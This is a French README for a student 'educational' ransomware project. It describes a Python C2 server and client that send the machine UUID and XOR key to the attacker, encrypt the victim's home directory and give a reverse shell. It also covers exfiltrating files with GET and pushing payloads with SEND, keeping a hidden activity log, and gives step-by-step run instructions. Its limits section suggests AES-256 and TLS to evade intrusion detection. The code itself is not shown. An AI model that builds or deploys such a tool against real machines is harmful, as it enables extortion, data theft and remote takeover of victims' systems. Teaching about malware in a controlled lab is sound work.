Projet : Ransomware Pédagogique (C2 & Malware)
![unnamed-1](https://github.com/user-attachments/assets/47209242-9b54-492d-9b49-4ce8f8a1386d)

1. Présentation du Projet

Ce projet a été réalisé dans le cadre du module Ecriture d'un Malware en Python. L'objectif est de concevoir un logiciel malveillant fonctionnel capable de communiquer avec un serveur de contrôle (C2) pour exécuter des actions à distance sur une machine cible.

Le projet met en pratique les concepts suivants :

    Communication Réseau : Utilisation de sockets TCP pour un flux de données bidirectionnel.

    Cryptographie : Implémentation d'un algorithme XOR symétrique pour le chiffrement des données.

    Manipulation Système : Parcours récursif de l'arborescence Linux et exécution de commandes shell via Python.



2. Architecture Globale

Le système repose sur une architecture Client-Serveur robuste.
Le Serveur de Contrôle (C2)

Il agit comme l'interface de l'attaquant. Il attend les connexions entrantes, reçoit les informations d'identification de la victime et permet l'envoi d'ordres interactifs (Chiffrement, exfiltration, shell inversé).
Le Malware (Client)

L'agent s'exécute sur la machine victime. Dès son lancement, il s'identifie de manière unique et passe en mode "écoute" pour traiter les commandes envoyées par le serveur.



3. Fonctionnalités et Fonctionnement Technique
A. Identification et Exfiltration Initiale

Dès la connexion, le client effectue deux actions critiques :

    Récupération de l'UUID : Le client lit le fichier /proc/sys/kernel/random/uuid pour obtenir un identifiant unique de la machine cible.

    Génération de Clé : Une clé de 16 caractères est générée de manière sécurisée via os.urandom, simulant un accès à /dev/urandom. Ces informations sont immédiatement transmises au serveur pour enregistrement.

B. Chiffrement Récursif du Répertoire Personnel

La commande ENCRYPT déclenche un parcours complet du répertoire personnel (HOME) de l'utilisateur.

    Méthode : Utilisation de os.walk pour descendre dans tous les sous-dossiers.

    Algorithme : Chiffrement XOR bit à bit. C'est un algorithme symétrique où la même clé permet de chiffrer et déchiffrer.

    Stabilité : Pour éviter de corrompre la session (notamment sous VS Code), le malware exclut les dossiers système sensibles comme .vscode-server, .ssh ou .cache.

C. Transfert de Fichiers (Protocole GET/SEND)

Pour garantir l'intégrité des fichiers lors du transfert, un protocole en trois étapes a été développé :

    Annonce : L'expéditeur envoie la taille du fichier.

    Synchronisation : Le destinataire répond READY pour confirmer qu'il est prêt à recevoir.

    Transmission : Les données sont envoyées par blocs (chunks) de 4096 octets pour ne pas saturer la mémoire vive de la machine.

D. Reverse Shell Interactif

Toute commande non reconnue comme une commande interne (ex: ls, whoami, cat) est transmise au système via subprocess.check_output. Le résultat de la commande est ensuite renvoyé au serveur pour affichage.



4. Bonus : Journalisation et Analyse (Logs)

Conformément aux exigences de la Partie 2 du sujet, un système de logs complet a été intégré :

    Côté Client : Création d'un fichier caché ~/.system_trace.log. Il enregistre chaque succès de chiffrement, chaque fichier reçu et chaque commande exécutée. Cela permet à l'attaquant de vérifier l'état de l'infection.

    Côté Serveur : Génération d'un fichier c2_history.log sur la machine de l'attaquant, archivant toutes les commandes envoyées avec un horodatage précis (date et heure).




5. Guide d'Utilisation (Lancement du Projet)
Prérequis

    Prérequis

    Environnement : Deux terminaux sur la même machine (localhost) ou deux machines Linux distinctes sur le même réseau.

    Langage : Python 3.x installé sur les deux postes.

    Structure : Les scripts c2_server.py et ransomware_client.py doivent être accessibles.

Étape 0 : Configuration de l'IP (Optionnel)

Par défaut, le malware cherche le serveur sur 127.0.0.1 (votre propre machine).

    Si vous testez sur deux machines différentes, modifiez la ligne suivante dans ransomware_client.py :
    Python

    s.connect(("ADRESSE_IP_DU_SERVEUR", 8888))


Étape 1 : Lancement du Serveur (Attaquant)

Ouvrez un terminal sur la machine de l'attaquant et lancez le script :
Bash

python3 c2_server.py

Le serveur se met en écoute : [*] SERVEUR C2 PRET - En attente de connexion...

Étape 2 : Infection de la Cible (Victime)

Ouvrez un terminal sur la machine victime et lancez le malware :
Bash

python3 ransomware_client.py

Dès l'exécution, le serveur reçoit les informations d'identification (UUID et Clé XOR).

Étape 3 : Interaction et Contrôle

Une fois la connexion établie, le serveur affiche le menu d'aide. Vous pouvez alors piloter la victime avec les commandes suivantes :

    Exploration : Tapez ls -a ou pwd pour naviguer dans le système de la victime.

    Attaque : Tapez ENCRYPT pour chiffrer l'intégralité du répertoire HOME (les fichiers système sensibles sont automatiquement ignorés pour préserver la stabilité de la session).

    Restauration : Tapez DECRYPT pour rétablir les fichiers originaux à l'aide de la clé de session.

    Espionnage (Logs) : Tapez cat ~/.system_trace.log pour consulter en temps réel le journal d'activité du malware sur la machine cible.

    Exfiltration : Tapez GET Documents/secret.txt pour copier un fichier de la victime vers votre machine d'attaquant.

    Infiltration : Tapez SEND payload.sh pour envoyer un nouveau fichier malveillant sur la machine victime.




6. Analyse des Limites

    Chiffrement : L'algorithme XOR est vulnérable à l'analyse de fréquence. Une amélioration serait l'utilisation de l'AES-256.

    Furtivité : Les communications circulent en clair sur le réseau. Dans un scénario réel, l'utilisation de TLS (SSL) serait nécessaire pour échapper aux systèmes de détection d'intrusion (IDS).

